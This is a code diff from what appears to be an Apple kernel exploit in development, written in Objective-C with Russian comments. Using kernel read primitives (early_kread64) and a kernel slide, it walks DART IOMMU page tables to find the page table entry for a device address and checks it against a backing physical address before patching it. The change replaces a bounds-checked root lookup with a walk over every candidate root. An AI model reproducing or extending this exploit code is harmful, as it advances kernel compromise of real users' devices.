@@ -6745,60 +6745,58 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                       (unsigned long long)dartVA, (unsigned long long)dvt,
                       (unsigned long long)(dvt ? dvt - kslide2 : 0),
                       (uint32_t)(dvt - kslide2) == 0x7dafcb0 ? @" ✓" : @""]);
-            // 1.9.173 (р.43): table struct = [dartObj+0xcd0 + segIdx*8] (персистент;
-            // L0 embedded, +0x80 = leaf-struct ptr). Struct выбираем bounds-check'ом
-            // [tbl+0x20]≤DVA<[tbl+0x28] — segIdx не нужен. group+0xc50 не трогаем
-            // (транзиентная view — поэтому и пуста).
-            uint64_t tableRoot = 0;
-            for (uint32_t i = 0; i < 16 && !tableRoot; i++) {
+            // 1.9.186: bounds у table struct'ов пустые — bounds-гейт УБРАН: идём
+            // по ВСЕМ корням {ts[i], [ts[i]+0x80]} напрямую, walk по каждому;
+            // PTE PA-маска (backingPA) сама выбирает правильный корень и слот.
+            uint64_t roots[8] = {0};
+            int nroots = 0;
+            for (uint32_t i = 0; i < 8 && nroots < 8; i++) {
                 uint64_t ts = kp_untag_ptr(early_kread64(dartVA + 0xcd0 + (uint64_t)i * 8));
                 if (!kpLooksLikeKernelPointer(ts) || !kpSafeToRead(ts)) continue;
                 if ((uint32_t)(ts & 0x3fff) + 0x88 > 0x4000) continue;
-                uint64_t lo = early_kread64(ts + 0x20);
-                uint64_t hi = early_kread64(ts + 0x28);
+                roots[nroots++] = ts;
                 uint64_t leafS = kp_untag_ptr(early_kread64(ts + 0x80));
-                kpNote(r, [NSString stringWithFormat:@"  [P2] table struct [%u]=%#llx range [%#llx..%#llx) +0x80=%#llx%@",
-                          i, (unsigned long long)ts, (unsigned long long)lo, (unsigned long long)hi,
-                          (unsigned long long)leafS,
-                          (lo && hi && dva >= lo && dva < hi) ? @" ← DVA ВНУТРИ ✓" : @""]);
-                if (lo && hi && dva >= lo && dva < hi)
-                    tableRoot = (kpLooksLikeKernelPointer(leafS) && kpSafeToRead(leafS)) ? leafS : ts;
+                if (kpLooksLikeKernelPointer(leafS) && kpSafeToRead(leafS) && nroots < 8) roots[nroots++] = leafS;
+                uint64_t lo = early_kread64(ts + 0x20), hi = early_kread64(ts + 0x28);
+                kpNote(r, [NSString stringWithFormat:@"  [P2] table struct [%u]=%#llx range [%#llx..%#llx) +0x80=%#llx",
+                          i, (unsigned long long)ts, (unsigned long long)lo, (unsigned long long)hi, (unsigned long long)leafS]);
             }
-            if (!tableRoot) kpNote(r, [NSString stringWithFormat:@"  [P2] ни один table struct не содержит DVA=%#llx", (unsigned long long)dva]);
-            if (kpLooksLikeKernelPointer(tableRoot) && kpSafeToRead(tableRoot)) {
-                uint64_t pageIdx = dva >> 14;
-                uint32_t idxs[4] = { (uint32_t)((pageIdx & 0x3e00000000ULL) >> 33),
-                                     (uint32_t)((pageIdx & 0x1ffc00000ULL) >> 22),
-                                     (uint32_t)((pageIdx & 0x3ff800ULL) >> 11),
-                                     (uint32_t)(pageIdx & 0x7ff) };
-                kpNote(r, [NSString stringWithFormat:@"  [P2] walk: DVA=%#llx pageIdx=%#llx idx L0=%u L1=%u L2=%u leaf=%u (root=%#llx)",
-                          (unsigned long long)dva, (unsigned long long)pageIdx,
-                          idxs[0], idxs[1], idxs[2], idxs[3], (unsigned long long)tableRoot]);
-                uint64_t tbl = tableRoot;
+            uint64_t pageIdx = dva >> 14;
+            uint32_t idxs[4] = { (uint32_t)((pageIdx & 0x3e00000000ULL) >> 33),
+                                 (uint32_t)((pageIdx & 0x1ffc00000ULL) >> 22),
+                                 (uint32_t)((pageIdx & 0x3ff800ULL) >> 11),
+                                 (uint32_t)(pageIdx & 0x7ff) };
+            kpNote(r, [NSString stringWithFormat:@"  [P2] walk: DVA=%#llx pageIdx=%#llx idx L0=%u L1=%u L2=%u leaf=%u (корней=%d)",
+                      (unsigned long long)dva, (unsigned long long)pageIdx,
+                      idxs[0], idxs[1], idxs[2], idxs[3], nroots]);
+            for (int ri = 0; ri < nroots && !pteVA; ri++) {
+                uint64_t tbl = roots[ri];
                 for (int lvl = 0; lvl < 4 && !pteVA; lvl++) {
                     uint64_t ent = early_kread64(tbl + (uint64_t)idxs[lvl] * 8);
-                    kpNote(r, [NSString stringWithFormat:@"    L%d[%u] @ %#llx = %#018llx", lvl, idxs[lvl],
+                    kpNote(r, [NSString stringWithFormat:@"    root%d L%d[%u] @ %#llx = %#018llx", ri, lvl, idxs[lvl],
                               (unsigned long long)(tbl + (uint64_t)idxs[lvl] * 8), (unsigned long long)ent]);
                     if (lvl == 3) {
-                        pteVA = tbl + (uint64_t)idxs[3] * 8;
-                        origPTE = ent;
+                        if (ent && (ent & 1)) {
+                            pteVA = tbl + (uint64_t)idxs[3] * 8;
+                            origPTE = ent;
+                        }
                         break;
                     }
-                    if (!(ent & 1)) { kpNote(r, @"    обрыв: entry невалиден (bit0=0)"); break; }
+                    if (!(ent & 1)) break;
                     tbl = (ent << 4) & 0x3ffffffc000ULL;
-                    if (!kpLooksLikeKernelPointer(tbl) || !kpSafeToRead(tbl)) { kpNote(r, @"    обрыв: child не резолвится"); break; }
+                    if (!kpLooksLikeKernelPointer(tbl) || !kpSafeToRead(tbl)) break;
                 }
-                if (pteVA) {
-                    if ((origPTE & 0x000003FFFE000000ULL) == (backingPA & 0x000003FFFE000000ULL)) {
-                        kpNote(r, @"  [P2] ★ PTE PA совпал с backingPA — патчим");
-                    } else {
-                        kpNote(r, [NSString stringWithFormat:@"  [P2] PTE PA %#018llx ≠ backingPA — НЕ патчим (чужой PTE, проверить segIdx/индексы)",
-                                  (unsigned long long)origPTE]);
-                        pteVA = 0;
-                    }
+            }
+            if (pteVA) {
+                if ((origPTE & 0x000003FFFE000000ULL) == (backingPA & 0x000003FFFE000000ULL)) {
+                    kpNote(r, @"  [P2] ★ PTE PA совпал с backingPA — патчим");
+                } else {
+                    kpNote(r, [NSString stringWithFormat:@"  [P2] PTE PA %#018llx ≠ backingPA — НЕ патчим (чужой PTE, неверный DVA/корень)",
+                              (unsigned long long)origPTE]);
+                    pteVA = 0;
                 }
             } else {
-                kpNote(r, @"  [P2] tableRoot не найден (group/дубль пусты)");
+                kpNote(r, @"  [P2] ни один корень не дал валидный leaf (bit0) для DVA");
             }
         }
         // 1.9.172: FALLBACK — PTE сканом по таблицам от ТЕРМИНАЛЬНОГО dartObj
